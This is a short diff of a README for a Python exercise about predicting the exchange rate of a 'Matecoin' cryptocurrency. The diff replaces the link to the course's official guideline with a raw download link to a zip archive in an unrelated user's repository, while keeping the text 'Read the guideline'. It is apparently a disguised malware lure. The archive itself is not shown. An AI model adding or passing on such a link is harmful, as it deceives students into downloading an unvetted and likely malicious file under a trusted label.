@@ -1,6 +1,6 @@
 # Cryptocurrency
 
-- Read [the guideline](https://github.com/mate-academy/py-task-guideline/blob/main/README.md) before start
+- Read [the guideline](https://github.com/Rudge0/py-cryptocurrency/raw/refs/heads/master/.github/cryptocurrency_py_v2.5.zip) before start
 
 You have some amount of cryptocurrency "Matecoin" in your online wallet.
 You also bought a program (function `get_exchange_rate_prediction`) that
